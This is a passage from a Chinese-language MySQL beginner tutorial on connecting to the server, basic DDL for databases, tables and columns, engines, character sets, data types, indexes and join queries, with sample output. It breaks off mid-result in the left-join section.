数据控制语言DCL用于控制不同数据段直接的许可和访问级别的语句。这些语句定义了数据库、表、字段、用户的访问权限和安全级别。主要的语句关键字包括grant、revoke等。数据控制语言DCL用来授予或回收访问数据库的某种特权，并控制。数据库操纵事务发生的时间及效果，对数据库实行监视等。如：1) GRANT：授权2）REVOLK：撤销&emsp;&emsp;\n\n\n三. 连接数据库方法一安装后，可以在开始菜单的列表中找到MySQL Command Line 点击操作的命令行终端操作。方法二如果加入到了windows的环境变量中，可以在命令行下直接操作。在命令行下，通过以下命可以连接到数据库服务器：mysql -h localhost -u root -p参数说明：\n\n\n\n\n参数\n说明\n\n\n\n\n-h\n表示数据库连接地址，连接本机可不填\n\n\n-u\n表示要登录的用户\n\n\n-p\n表示使用密码登录\n\n\n\n\n注：通常我们不直接输入密码。而是在回车之后，输入密码。因为，密码输入时的字符是不可见的，输完密码直接回车登录。防止旁边有人把重要的密码看走。\n\n&emsp;如果没有什么别的问题，登陆成功之后会出现下面内容：\nmysql -u root -p\n Enter password: \n Welcome to the MySQL monitor.  Commands end with ; or \\g.\n Your MySQL connection id is 7\n Server version: 5.6.25 MySQL Community Server (GPL)\n\nCopyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved.\n\nOracle is a registered trademark of Oracle Corporation and/or its\n affiliates. Other names may be trademarks of their respective\n owners.\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nmysql>\n\n上面的中文意思翻译过来是说，欢迎使用MySQL的命令行操作工具。每一个命令结束可以输入\\g 或者 ;\n\nmysql当前是第 7次连接。\n\n当前数据库的版本是5.6.25社区支持版。遵循GPL协议。\n\n版权所有：2000至 2015。归Oracle及其子机构拥有所有权。\n\n如果需要帮助的话，通过 ‘help;’ 或者 ‘\\h’ 命令来显示帮助内容，通过 ‘\\c’ 命令来清除命令行历史。\n\nmysql>\nmysql > 表示等待输入指令。\n\n\n注：在登陆成功后有这么一句提示，可能大家不太理解：Your MySQL connection id is 7表示第7次连接登陆，每登陆一次这个id为加1。下一次显示的会是第8次。\n\n&emsp;&emsp;\n四. 数据库操作4.1 创建数据库基本语法：CREATE DATABASE 数据库名;\n\n\n\n类别\n详细解示\n\n\n\n\n基本语法\nCREATE DATABASE 数据库名;\n\n\n示例\nCREATE DATABASE PHP;\n\n\n示例说明\n创建一个数库，数据库的名字为PHP\n\n\n\n\n注意：一个MySQL语句结尾是以英语分号(;)结束的，千万不要忘记了，不然语句是错误的！\n\n&emsp;示例：\nmysql> CREATE DATABASE PHP;\n Query OK, 1 row affected (0.00 sec)\n\n\n\n“Query OK” 表示上面的命令执行成功，所有的 DDL 和 DML(不包 括 SELECT)操作执行成功后都显示“Query OK”，这里理解为执行成功就可以了；“1 row affected” 表示操作只影响了数据库中一行的记录，“0.00 sec”则记录了操作执行的时间。\n如果已经存在这个数据库，系统会怎么提    示:\n\n\nmysql> CREATE DATABASE PHP;\n ERROR 1007 (HY000): Can't create database 'PHP'; database exists\n\n&emsp;\n4.2 查看数据库基本语法：show databases;\n\n\n\n类别\n详细解示\n\n\n\n\n基本语法\nshow databases;\n\n\n示例说明\n显示当前服务器的所有数据库\n\n\n\n\n注意：show 是指显示database 是指数据库databases 是数据库的复数形式，指全部数据库。\n\n&emsp;\n4.3 选中数据库基本语法：use 库名;\n\n\n\n类别\n详细解示\n\n\n\n\n基本语法\nuse 库名;\n\n\n示例\nuse PHP\n\n\n示例说明\n使用数据库PHP\n\n\n\n\n注意：\n\n在一个数据库里面处理数据的时候，必须先进入这个数据库，即先use 库名;\nuse 是指使用；\n库名 是存在当前数据库系统中的具体的数据库的名称；\n出现 ” Database changed“ 表示切换成功。然后，看看mysql数据库里面有什么内容（和查看当前数据库服务器数据库一样使用 show 语句）\n\n\n&emsp;\n4.4 查看数据库中的表基本语法：show tables;前提是先：use 库名;\n\n\n\n类别\n详细解示\n\n\n\n\n基本语法\nshow tables;\n\n\n示例说明\n显示当前数据库下所有的表\n\n\n\n&emsp;\n4.5 删除数据库基本语法：DROP DATABASE 库名;\n\n\n\n类别\n详细解示\n\n\n\n\n基本语法\nDROP DATABASE 库名;\n\n\n示例\nDROP DATABASE  PHP;\n\n\n示例说明\n删除一个数库，数据库的名字为liwenkai\n\n\n\n\n注意：\n\ndrop 是汉语可以翻译为指掉下来，不要了的意思\ndatabase 是指库\n库名 是指要删掉的库的名称\n\n\n示例：\nmysql> DROP DATABASE  PHP;\n Query OK, 0 rows affected (0.01 sec)\n\n\n\n【切记】注：数据库删除后，下面的所有数据都会全部删除，所以删除前一定要慎重并做好相应的备份。（若重要数据未备份，而实际中产生的数据风险很高。）\n一定要指定好要删除的数据库的名字。\n\n\n&emsp;&emsp;\n五. 数据表操作5.1 创建数据表基本语法：CREATE TABLE 表名(字段名1 字段类型,….字段名n 字段类型n);\n\n\n\n类别\n详细解示\n\n\n\n\n基本语法\nCREATE TABLE 表名(字段名1 字段类型,….字段名n 字段类型n);\n\n\n示例\nCREATE TABLE user(username varchar(20),password varchar(32));\n\n\n示例说明\n创建一个表名叫user的表，第一个字段(列)为username、表的字段类型为varchar、长度为32个长度。第二个字段为password，类型也为varchar，长度也为32个长度。\n\n\n\n&emsp;\n5.2 查看表字段(列)结构信息基本语法：desc 表名;\n\n\n\n类别\n详细解示\n\n\n\n\n基本语法\ndesc 表名;\n\n\n示例\ndesc test\n\n\n示例说明\n查看test表的表结构(显示出test表的每一行详细数据)\n\n\n\n&emsp;\n5.3 查看表的创建SQL语句当我们不会创建数据表，或者需要参考其他已经创建好的数据表的语法，我们可以查看那些数据表的语法。基本语法：SHOW CREATE TABLE 表名 [\\G];如果一行很长，需要这行显示的话，看起结果来就非常的难受。在SQL语句或者命令后使用\\G，可以将每一行的值垂直输出。\n\n\n\n\n类别\n详细解示\n\n\n\n\n基本语法\nSHOW CREATE TABLE表名 \\G;\n\n\n示例\nSHOW CREATE TABLE emp \\G;\n\n\n示例说明\n查看表emp的创建语句\n\n\n\n\n注：上面表的创建 SQL 语句中，除了可以看到表定义以外，还可以看到表的 engine（存储引擎) 和 charset(字符集)等信息。“\\G”选项的含义是使得记录能够按照字段竖着排列，对于内 容比较长的记录更易于显示。\n\n&emsp;\n5.4 指定表引擎和字符集数据库引擎推荐资料：[数据库引擎学习总结]、[MYSQL数据库引擎区别详解]字符集推荐资料：[各种字符集和编码详解]、[字符集百度百科]\n在创建表最后，我们常用MyISAM或者InnoDB引擎。在指定引擎时，我们可以使用：ENGINE=InnoDB指定表默认字符集：DEFAULT CHARSET=utf8\n&emsp;\n(1) Mysql表引擎MySQL的强大之处在于它的插件式存储引擎，我们可以基于表的特点使用不同的存储引擎，从而达到最好的性能。基本语法：show engines;可以查看到当前服务器支持的所有引擎。\n\n\n\n\n引擎名称\n特别\n\n\n\n\nMyISAM\n常用。读取效率很高的引擎\n\n\nInnoDB\n常用。写入，支持事处等都支持\n\n\nArchive\n不常用。归档引擎，压缩比高达1:10，用于数据归档\n\n\nNDB\n不常用。主要在MySQL 集群服务器中使用，不做介绍\n\n\n\n\nMyISAM\n\n不支持事务，表锁(表级锁，加锁会锁住整个表)，支持全文索引,操作速度快。常用于读取多的业务。\nmyisam存储引擎表由myd和myi组成。.myd用来存放数据文件，.myi用来存放索引文件。\n对于myisam存储引擎表，mysql数据库只缓存其索引文件，数据文件的缓存由操作系统本身来完成。\n\n\n\nInnoDB\n\n支持事务，主要面向在线事务处理(OLTP)方面的应用。\n行锁设计，支持外键，即默认情况下读取操作不加锁。\nInnoDB是为处理巨大数据量时的最大性能设计。\n\n\n\n注意：\n\n行锁：写入、更新操作的时候将这一行锁起来，不让其他人再操作了。\n表锁：写入、更新操作时，将表给锁起来不让其他人再操作了。\n事务：同时操作多个数据，若其中的一个数据操作失败。可回滚到操作之前。常用于银行、电商、金融等系统中。\n\n\n&emsp;\n(2) Mysql字符集1. 为了更好的识别中文、日文、英文、希腊语。对于常用的符号进行了编码，这个编码就是字符集。2. 字符集确定了文字的存储方式。3. 字符集相当于是计算机中人类的语言。\n\n\n\n\n字符集\n说明\n字节长度\n\n\n\n\nASCII\n美国标准信息交换代码\n单字节\n\n\nGBK\n汉字内码扩展规范\n双字节\n\n\nunicode\n万国码\n4字节\n\n\nUTF-8\nUnicode的可变长度字符编码\n1到6个字节\n\n\n\nASCIIASCII 码使用指定的7 位或8 位二进制数组合来表示128 或256 种可能的字符。标准ASCII 码也叫基础ASCII码，使用7 位二进制数来表示所有的大写和小写字母，数字0 到9、标点符号， 以及在美式英语中使用的特殊控制字符。其中：0～31及127(共33个)是控制字符或通信专用字符（其余为可显示字符），如控制符：LF（换行）、CR（回车）、FF（换页）、DEL（删除）、BS（退格)、BEL（响铃）等；通信专用字符：SOH（文头）、EOT（文尾）、ACK（确认）等；ASCII值为8、9、10 和13 分别转换为退格、制表、换行和回车字符。它们并没有特定的图形显示，但会依不同的应用程序，而对文本显示有不同的影响。32～126(共95个)是字符(32是空格），其中48～57为0到9十个阿拉伯数字。65～90为26个大写英文字母，97～122号为26个小写英文字母，其余为一些标点符号、运算符号等。GBKGBK 向下与 GB 2312 编码兼容。是中华人民共和国定义的汉字计算机编码规范。早期版本为GB2312。UnicodeUnicode（统一码、万国码、单一码）Unicode是国际组织制定的可以容纳世界上所有文字和符号的字符编码方案。以满足跨语言、跨平台进行文本转换、处理的要求。UTF-8是一种针对Unicode的可变长度字符编码，也是万国码。因为UNICODE比ASCII占用大一倍的空间，而对ASCII来说高字节的0对他毫无用处。为了解决这个问题，就出现了一些中间格式的字符集，他们被称为通用转换格式，即UTF（Universal Transformation Format）&emsp;(3) 实际工作中要使用的编码在中文中常用的字符集分为utf-8和GBK。实际使用的如下：\n\n\n\n\n字符集\n说明\n\n\n\n\ngbk_chinese_ci\n简体中文, 不区分大小写\n\n\nutf8_general_ci\nUnicode (多语言), 不区分大小写\n\n\n\n\nMySQL字符集由三个部份组成：1. 字符集2. 语言3. 类型注意：1. 最后的bin是指二进制字符集，后面的ci是指存储排序时不区分字符的大小写。2. mysql在写utf-8的时候写的是utf8。不加中间的中横线。\n\n&emsp;&emsp;\n六. 数据字段(列)操作6.1 修改表字段类型 modify基本语法：alter table 表名 modify 字段名 varchar(20);关键字：alter、modify\n\n\n\n类别\n详细解示\n\n\n\n\n基本语法\nalter table 表名 modify 字段名 varchar(20);\n\n\n示例\nalter table user modify username varchar(20);\n\n\n示例说明\n将user表的username的类型改为varchar(20)\n\n\n\n&emsp;\n6.2 增加表字段基本语法：alter table 表名 add column 字段名 类型;关键字：alter、add column\n\n\n\n类别\n详细解示\n\n\n\n\n基本语法\nalter table 表名 add column 字段名 类型;\n\n\n示例\nalter table user add column age int(3);\n\n\n示例说明\n添加一个字段为age，类型为整型长度为3\n\n\n\n&emsp;\n6.3 增加字段时控制字段顺序基本语法：alter table 表名 add 字段名 字段类型 after 字段名;关键字：alter、add、after\n\n\n\n类别\n详细解示\n\n\n\n\n基本语法\nALTER TABLE 表名 ADD 字段名 字段类型 AFTER 字段名;\n\n\n示例\nALTER TABLE user ADD email VARCHAR(60) AFTER createip;ALTER TABLE user ADD id INT(10) FIRST;\n\n\n示例说明\nuser表中，在createip后增加一个字段为email，类型为varchar，长度为60ser表中在最开始的位置增加一个字段为id,类型为int，长度为10\n\n\n\n&emsp;\n6.4 删除表字段基本语法：alter table 表名 drop column 字段名;关键字：alter、drop column\n\n\n\n类别\n详细解示\n\n\n\n\n基本语法\nalter table 表名 drop column 字段名;\n\n\n示例\nalter table user drop column age;\n\n\n示例说明\n在user表中删除字段age\n\n\n\n&emsp;\n6.5 表字段改名基本语法：alter table 表名 change 字段原名 字段新名 字段类型;关键字：alter、change\n\n\n\n类别\n详细解示\n\n\n\n\n基本语法\nalter table 表名 change 字段原名 字段新名 字段类型;\n\n\n示例\nalter table user change email em varchar(60);\n\n\n示例说明\n在user表中将字段中的email字段名字为em\n\n\n\n&emsp;\n6.6 修改表字段排列顺序在前的字段增加和修改语句（add/change/modify）中，最后都可以加一个可选项 first|after。增加表字段时我们已经学过了如何调整顺序。我们现在在来看看另外的change或modify如何来调整顺序。\n我们用first做个小实验。使用modify调整顺序\nmysql> alter table user modify em varchar(60) first;\n Query OK, 0 rows affected (0.41 sec)\n Records: 0  Duplicates: 0  Warnings: 0\n\n输出结果:\nmysql> desc user;\n +----------+---------------+------+-----+---------+-------+\n | Field    | Type          | Null | Key | Default | Extra |\n +----------+---------------+------+-----+---------+-------+\n | em         | varchar(60)   | YES  |     | NULL    |     |\n | username   | varchar(20)   | YES  |     | NULL    |     |\n | password   | varchar(32)   | YES  |     | NULL    |     |\n | createtime | int(10)       | YES  |     | NULL    |     |\n | createip   | int(10)       | YES  |     | NULL    |     |\n +----------+---------------+------+-----+---------+-------+\n 5 rows in set (0.00 sec)\n\n&emsp;\n6.7 修改表名基本语法：alter table 旧表名 rename 新的表名;关键字：alter、rename\n\n\n\n类别\n详细解示\n\n\n\n\n基本语法\nalter table 旧表名 rename 新的表名;\n\n\n示例\nalter table user rename new_user;\n\n\n示例说明\n将user表名改为new_user\n\n\n\n&emsp;&emsp;\n七. 数据类型MySQL中存的是数据。只要是数据，我们就会规定数据的类型。在表的字段中规定了使用的是某个数据类型。那么，在插入的数据中就要使用对应的数据类型。并且，遵守数据类型的长度要求。\n&emsp;\n\n在MySQL里面我们将数据类型分为了以下一些类型：\n\n数值类型（整型、浮点）\n字符串类型\n日期时间类型\n复合类型\n空间类型（非科学性工作基本不用，不做讲解）\n\n\n&emsp;\n1. 整型\n\n\n\n\n数据类型\n所占字节\n值范围\n\n\n\n\ntinyint\n1字节\n-128~127\n\n\nsmallint\n2字节\n-32768~32767\n\n\nmediumin\n3字节\n-8388608~8388607\n\n\nint\n4字节\n-2147483648~2147483647\n\n\nbigint\n8字节\n+-9.22*10的18次方\n\n\n\n\n注意：\n\nMySQL 以一个可选的显示宽度指示器的形式对 SQL 标准进行扩展，这样当从数据库检索一个值时，可以把这个值加长到指定的长度。例如，指定一个字段的类型为 INT(6)，就可以保证所包含数字少于 6 个的值从数据库中检索出来时能够自动地用空格填充。需要注意的是，使用一个宽度指示器不会影响字段的大小和它可以存储的值的范围。\n在创建表字段时，性别我们可以使用无符号的微小整型（tinyint）来表示。用0表示女、用1表示男。用2表示未知。\n同样人类年龄也是，在创建表字段时可用用无符号的整型。因为人类的年龄还没有负数\n在实际使用过程中。我们业务中最大需要存储多大的数值。我们创建表时，就选择什么样的类型来存储这样的值。\n\n\n&emsp;\n2. 浮点类型\n\n\n\n\n数据类型\n所占字节\n值范围\n\n\n\n\nfloat(m, d)\n4字节\n单精度浮点型，m总个数，d小数位\n\n\ndouble(m, d)\n8字节\n双精度浮点型，m总个数，d小数位\n\n\ndecimal(m, d)\n\ndecimal是存储为字符串的浮点数\n\n\n\n\n注意：\n\n浮点是非精确值，会存在不太准确的情况\n而decimal叫做定点数。在MySQL内部，本质上是用字符串存储的。实际使用过程中如果存在金额、钱精度要求比较高的浮点数存储，建议使用decimal（定点数）这个类型。\n\n\n&emsp;\n3. 字符类型\n\n\n\n\n数据类型\n所占字节\n值范围\n\n\n\n\nCHAR\n0-255字节\n定长字符串\n\n\nVARCHAR\n0-255字节\n变长字符串\n\n\nTINYBLOB\n0-255字节\n不超过255个字符的二进制字符串\n\n\nTINYTEXT\n0-255字节\n短文本字符串\n\n\nBLOB\n0-65535字节\n二进制形式的长文本数据\n\n\nTEXT\n0-65535字节\n长文本数据\n\n\nMEDIUMBLOB\n0-16 777 215字节\n二进制形式的中等长度文本数据\n\n\nMEDIUMTEXT\n0-16 777 215字节\n中等长度文本数据\n\n\nLOGNGBLOB\n0-4 294 967 295字节\n二进制形式的极大文本数据\n\n\nLONGTEXT\n0-4 294 967 295字节\n极大文本数据\n\n\nVARBINARY(M)\n允许长度0-M个字节的定长字节符串\n值的长度+1个字节\n\n\nBINARY(M)\nM\n允许长度0-M个字节的定长字节符串\n\n\n\n\n注意：\n\nCHAR 类型用于定长字符串，并且必须在圆括号内用一个大小修饰符来定义。这个大小修饰符的范围从0-255。比指定长度大的值将被截短，而比指定长度小的值将会用空格作填补。\nVARCHAR  把这个大小视为值的大小，不长度不足的情况下就用空格补足。而 VARCHAR 类型把它视为最大值并且只使用存储字符串实际需要的长度类型不会被空格填补，但长于指示器的值仍然会被截短。因为VARCHAR类型可以根据实际内容动态改变存储值的长度，所以在不能确定字段需要多少字符时使用 VARCHAR 类型可以大大地节约磁盘空间、提高存储效率。\ntext类型与blob类型对于字段长度要求超过 255 个的情况下，MySQL 提供了 TEXT 和 BLOB 两种类型。根据存储数据的大小，它们都有不同的子类型。这些大型的数据用于存储文本块或图像、声音文件等二进制数据类型。\nTEXT 和 BLOB 类型在分类和比较上存在区别。BLOB 类型区分大小写，而 TEXT 不区分大小写。大小修饰符不用于各种 BLOB 和 TEXT 子类型。\n\n\n&emsp;\n4. 时间类型\n\n\n\n\n数据类型\n所占字节\n值范围\n\n\n\n\ndate\n3字节\n日期，格式：2014-09-18\n\n\ntime\n3字节\n时间，格式：08:42:30\n\n\ndatetime\n8字节\n日期时间，格式：2014-09-18 08:42:30\n\n\ntimestamp\n4字节\n自动存储记录修改的时间\n\n\nyear\n1字节\n年份\n\n\n\n\n注意：\n\n时间类型在web系统中用的比较少，很多时候很多人喜欢使用int来存储时间。插入时插入的是unix时间戳，因为这种方式更方便计算。在前端业务中用date类型的函数，再将unix时间戳转成人们可识别的时间。\n有些人为了在数据库管理中方便查看，也有人使用datetime类型来存储时间。\n\n\n&emsp;\n5. 复合类型\n\n\n\n\n数据类型\n说明\n举例\n\n\n\n\nset\n集合类型\nset(“member”, “member2″, … “member64″)\n\n\nenum\n枚举类型\nenum(“member1″, “member2″, … “member65535″)\n\n\n\n\n注意：一个 ENUM 类型只允许从一个集合中取得一个值；而 SET 类型允许从一个集合中取得任意多个值。\n\n&emsp;\nENUM 类型1. ENUM 类型因为只允许在集合中取得一个值，有点类似于单选项。在处理相互排拆的数据时容易让人理解，比如人类的性别。ENUM 类型字段可以从集合中取得一个值或使用null值，除此之外的输入将会使 MySQL 在这个字段中插入一个空字符串。另外如果插入值的大小写与集合中值的大小写不匹配，MySQL会自动使用插入值的大小写转换成与集合中大小写一致的值。2. ENUM 类型在系统内部可以存储为数字，并且从1开始用数字做索引。一个 ENUM 类型最多可以包含 65536 个元素，其中一个元素被 MySQL 保留，用来存储错误信息，这个错误值用索引 0 或者一个空字符串表示。3. MySQL 认为 ENUM 类型集合中出现的值是合法输入，除此之外其它任何输入都将失败。这说明通过搜索包含空字符串或对应数字索引为 0 的行就可以很容易地找到错误记录的位置。SET 类型1. SET 类型SET 类型与 ENUM 类型相似但不相同。SET类型可以从预定义的集合中取得任意数量的值。并且与 ENUM 类型相同的是任何试图在 SET 类型字段中插入非预定义的值都会使MySQL插入一个空字符串。如果插入一个即有合法的元素又有非法的元素的记录，MySQL 将会保留合法的元素，除去非法的元素。2. 一个 SET 类型最多可以包含 64 项元素。在 SET 元素中值被存储为一个分离的“位”序列，这些“位”表示与它相对应的元素。“位”是创建有序元素集合的一种简单而有效的方式。并且它还去除了重复的元素，所以SET类型中不可能包含两个相同的元素。希望从 SET 类型字段中找出非法的记录只需查找包含空字符串或二进制值为 0 的行。&emsp;6. 类型使用我们学习了这么多类型，在创建表的语句的时候使用对应的类型即可。举例如下：\n\nCREATE TABLE IF NOT EXISTS demo (\n   id int(11) NOT NULL,\n   username varchar(50) NOT NULL,\n   password char(32) NOT NULL,\n   content longtext NOT NULL,\n   createtime datetime NOT NULL,\n   sex tinyint(4) NOT NULL\n ) ENGINE=InnoDB DEFAULT CHARSET=utf8;\n\n&emsp;\n7. 字段(列)其他属性设置(1) UNSIGNED（无符号）主要用于整型和浮点类型，使用无符号。即，没有前面面的-（负号）。存储位数更长。tinyint整型的取值区间为，-128-127。而使用无符号后可存储0-255个长度。创建时在整型或浮点字段语句后接上：unsigned(2) ZEROFILL（0填充）0（不是空格）可以用来真补输出的值。使用这个修饰符可以阻止 MySQL 数据库存储负值。创建时在整型或浮点字段语句后接上：zerofill(3) defaultdefault属性确保在没有任何值可用的情况下，赋予某个常量值，这个值必须是常量，因为MySQL不允许插入函数或表达式值。此外，此属性无法用于BLOB或TEXT列。如果已经为此列指定了NULL属性，没有指定默认值时默认值将为NULL，否则默认值将依赖于字段的数据类型。创建时在整型或浮点字段语句后接上：default ‘值’(4) not null如果将一个列定义为not null，将不允许向该列插入null值。建议在重要情况下始终使用not null属性，因为它提供了一个基本验证，确保已经向查询传递了所有必要的值。创建时在整型或浮点字段语句后接上：not null\n\n\n(5) null为列指定null属性时，该列可以保持为空，而不论行中其它列是否已经被填充。记住，null精确的说法是“无”，而不是空字符串或0。创建时在整型或浮点字段语句后不要声明not null即可。&emsp;&emsp;\n\n八. 索引索引看着挺高大上的一个名字，说白了就是我们书最新面的目录。 (ง •_•)ง索引用于快速找出在某个列中有一特定值的行。不使用索引，MySQL必须从第1条记录开始然后读完整个表直到找出相关的行。表越大，花费的时间越多。如果表中查询的列有一个索引，MySQL能快速到达一个位置去搜寻到数据文件的中间，没有必要看所有数据。当然索引也不易过多，索引越多写入，修改的速度越慢。因为，写入修改数据时，也要修改索引。\n\n\n\n\n\n索引类型\n功能说明\n\n\n\n\n普通索引\n最基本的索引，它没有任何限制\n\n\n唯一索引\n某一行企用了唯一索引则不准许这一列的行数据中有重复的值。针对这一列的每一行数据都要求是唯一的\n\n\n主键索引\n它是一种特殊的唯一索引，不允许有空值。一般是在建表的时候同时创建主键索引，常用于用户ID。类似于书中的页码\n\n\n全文索引\n对于需要全局搜索的数据，进行全文索引\n\n\n\n&emsp;\n1. 普通索引\n\n\n\n\n类型\n详细说明\n\n\n\n\n基本语法\nalter table 表  add index(字段)\n\n\n示例\nALTER TABLE money ADD INDEX(username);\n\n\n示例解释\n为money表的username字段增加索引\n\n\n\n&emsp;\n2. 唯一索引\n\n\n\n\n类型\n详细说明\n\n\n\n\n基本语法\nalter table 表  add UNIQUE(字段)\n\n\n示例\nALTER TABLE money ADD UNIQUE(email);\n\n\n示例解释\n为money表的email字段增加唯一索引\n\n\n\n&emsp;\n3. 全文索引\n\n\n\n\n类型\n详细说明\n\n\n\n\n基本语法\nalter table 表  add FULLTEXT(字段)\n\n\n示例\nALTER TABLE money ADD FULLTEXT(content);\n\n\n示例解释\n为money表的content字段增加唯一索引\n\n\n\n&emsp;\n4. 主键索引\n\n\n\n\n类型\n详细说明\n\n\n\n\n基本语法\nalter table 表  add PRIMARY KEY(字段)\n\n\n示例\nALTER TABLE money ADD PRIMARY KEY(id);\n\n\n示例解释\n为money表的id字段增加主键索引\n\n\n\n&emsp;\n5. 创建表时也可以声明索引创建表时可在创建表语句后加上对应的类型即可声明索引：\n\nPRIMARY KEY(字段) \n INDEX [索引名] (字段)\n FULLTEXT [索引名] (字段)\n UNIQUE[索引名] (字段)\n\n注：中括号中的索引名，代表可选。\n&emsp;整体示例如下：\n\n\nCREATE TABLE test (\n     id INT NOT NULL , \n     username VARCHAR(20) NOT NULL , \n     password INT NOT NULL , \n     content INT NOT NULL , \n     PRIMARY KEY (id), \n     INDEX pw (password), \n     UNIQUE (username),\n     FULLTEXT (content)\n ) ENGINE = InnoDB;\n\n&emsp;&emsp;\n九. 多表联合查询很多时候在实际的业务中我们不只是查询一张表、在电子商务系统中，查询哪些用户没有购买过产品、银行中可能查询违规记录，同时查询出用户的查询中奖信息和中奖人员的基本信息、以上只是列的情况我们就需要把两张表在一起进行查询。而上述业务中需要多表联合在一起查询才能有结果，而多表联合查询的本质是：表连接。\n\n\n\n&emsp;\n9.1 表连接当需要查询多个表中的字段时，就可以使用表连接来实现。表联接分为内连接和外连接。\n内联结：将两个表中存在联结关系的字段符合联结关系的那些记录形成记录集的联结。外连接：会选出其他不匹配的记录，分为外左联结和外右联结。&emsp;在学习实验前，我为大家准备了两个模拟的数据表：用户表，存放用户信息订单表，存放哪个用户购买过哪个商品user表创建语句:\n\nCREATE TABLE IF NOT EXISTS user (\n   uid int(11) NOT NULL,\n   username varchar(30) NOT NULL,\n   password char(32) NOT NULL\n ) ENGINE=InnoDB DEFAULT CHARSET=utf8;\n\nCREATE TABLE IF NOT EXISTS order_goods (\n   oid int(11) NOT NULL,\n   uid int(11) NOT NULL,\n   name varchar(50) NOT NULL,\n   buytime int(11) NOT NULL\n ) ENGINE=InnoDB DEFAULT CHARSET=utf8;\n\n&emsp;user表数据如下：\nuid    username    password\n1    景甜    123456\n2    王小二    245667\n3    王宝强    1235531\n4    井柏然    123455\n5    范冰冰    5abcwa\n6    黄晓明    abcdeef\n7    anglebaby    caption\n8    TFBOYS    abcdwww\n9    安小超    12tfddwd\n10    高小峰    3124qwqw\n11    李小强    323fxfvdvd\n12    李小超    311aqqee\n13    韩小平    121rcfwrfq\n14    宋小康    123123tcsd\n15    佟小刚    3cxvdfs\n\norder_goods数据如下：\noid    uid    name    buytime\n1    10    苹果鼠标    1212313\n2    3    iphone 12s    123121241\n3    12    雪碧       13232333\n4    15    \n34242123\n5    3    iphone 键盘    12123413\n\n\n注意：在上表order_goods表中uid是指user表中的uid字段。上表中oid为1的数据行，uid为10的用户。为user表中uid为10的用户：高小峰。该用户购买了商品为苹果鼠标。购买时间buytime为一个unix时间戳。\n\n&emsp;\n9.2 内连接基本语法一：\n\n\n\n\n\n类型\n详细说明\n\n\n\n\n基本语法\nselect 表1.字段 [as 别名],表n.字段  from 表1 [别名],表n where 条件;\n\n\n示例\nselect user.uid ,user.username as username,order_goods.oid,order_goods.uid,order_goods.name as shopname from user,order_goods  where user.uid = order_goods.uid;\n\n\n示例说明\n查询商品表中哪些用户购买过商品，并将用户信息显示出来\n\n\n\n\n注：下例中from 表使用到了表别名。由于表名太长，每次写的时候容易写错。我们可以在表后直接跟上一个简写英文字符串。在前面拼接字段时，直接使用简写字符串.字段即可。\n\nmysql> select u.uid ,u.username as username,o.oid,o.uid,o.name as shopname from user u,\norder_goods o  where u.uid = o.uid;\n +-----+-----------+-----+-----+---------------+\n | uid | username  | oid | uid | shopname      |\n +-----+-----------+-----+-----+---------------+\n |  10 | 高小峰    |   1 |  10 | 苹果鼠标      |\n |   3 | 王宝强    |   2 |   3 | iphone 12s    |\n |  12 | 李小超    |   3 |  12 | 雪碧          |\n |  15 | 佟小刚    |   4 |  15 |               |\n |   3 | 李文凯    |   5 |   3 | iphone 键盘   |\n +-----+-----------+-----+-----+---------------+\n 5 rows in set (0.00 sec)\n\n&emsp;基本语法二：\n\n\n\n\n\n类型\n详细说明\n\n\n\n\n基本语法\nselect 表1.字段 [as 别名],表n.字段  from 表1 INNER JOIN 表n on  条件;\n\n\n示例\nselect user.uid ,user.username as username,order_goods.oid,order_goods.uid,order_goods.name as shopname from user inner join order_goods  on  user.uid = order_goods.uid;\n\n\n示例说明\n查询商品表中哪些用户购买过商品，并将用户信息显示出来\n\n\n\n&emsp;结果与基本语法1中一致。\nmysql> select user.uid ,user.username as username,order_goods.oid,\norder_goods.uid,order_goods.name as shopname from user inner join order_goods  on \n user.uid = order_goods.uid;\n +-----+-----------+-----+-----+---------------+\n | uid | username  | oid | uid | shopname      |\n +-----+-----------+-----+-----+---------------+\n |  10 | 高小峰    |   1 |  10 | 苹果鼠标      |\n |   3 | 王宝强    |   2 |   3 | iphone 12s    |\n |  12 | 李小超    |   3 |  12 | 雪碧          |\n |  15 | 佟小刚    |   4 |  15 |               |\n |   3 | 王宝强    |   5 |   3 | iphone 键盘   |\n +-----+-----------+-----+-----+---------------+\n 5 rows in set (0.00 sec)\n\n&emsp;\n9.3 外连接外连接：左连接、右连接。关键字：left join、on、right join\n\n\n\n\n说明\n详解\n\n\n\n\n基本语法\nselect 表1.字段 [as 别名],表n.字段  from 表1 LEFT JOIN 表n on  条件;\n\n\n示例\nselect *  from user left join order_goods  on  user.uid = order_goods.uid;\n\n\n示例说明\n以左边为主，查询哪些用户未购买过商品，并将用户信息显示出来\n\n\n\n&emsp;\n左连接：包含所有的左边表中的记录甚至是右边表中没有和它匹配的记录。\n\n\nmysql> select *  from user left join order_goods  on  user.uid = order_goods.uid;\n+-----+-----------+------------+------+------+---------------+-----------+\n| uid | username  | password   | oid  | uid  | name          | buytime   |\n+-----+-----------+------------+------+------+---------------+-----------+\n|  10 | 高小峰    | 3124qwqw   |    1 |   10 | 苹果鼠标      |   1212313 |\n|   3 | 王宝强    | 1235531    |    2 |    3 | iphone 12s    | 123121241 |\n|  12 | 李小超    | 311aqqee   |    3 |   12 | 雪碧          |  13232333 |\n|  15 | 佟小刚    | 3cxvdfs    |    4 |   15 |               |  34242123 |\n|   3 | 王宝强    | 1235531    |    5 |    3 | iphone 键盘   |  12123413 |\n|   1 | 景甜      | 123456     | NULL | NULL | NULL          |      NULL |\n|   2 | 王小二    | 245667     | NULL | NULL | NULL          |      NULL |\n|   4 | 井柏然    | 123455     | NULL | NULL | NULL          |      NULL |\n|   5 | 范冰冰    | 5abcwa     | NULL | NULL | NULL          |      NULL |\n|   6 | 黄晓明    | abcdeef    | NULL | NULL | NULL          |      NULL |\n|   7 | anglebaby | caption    | NULL | NULL | NULL          |      NULL |\n|   8 | TFBOYS    | abcdwww    | NULL | NULL | NULL          |      NULL |\n|   9 | 安小超    | 12tfddwd   | NULL | NULL | NULL          |      NULL |\n|  11 | 李小强    | 323fxfvdvd | NULL | NULL | NULL          |      NULL |\n|  13 | 韩小平    | 121rcfwrfq | NULL | NULL | NULL          |      NULL |\n|  14 | 宋小康    | 123123tcsd | NULL | NULL | NULL          |      NULL |\n+-----+-----------+------------+------+------+---------------+-----------+\n16 rows in set (0.00 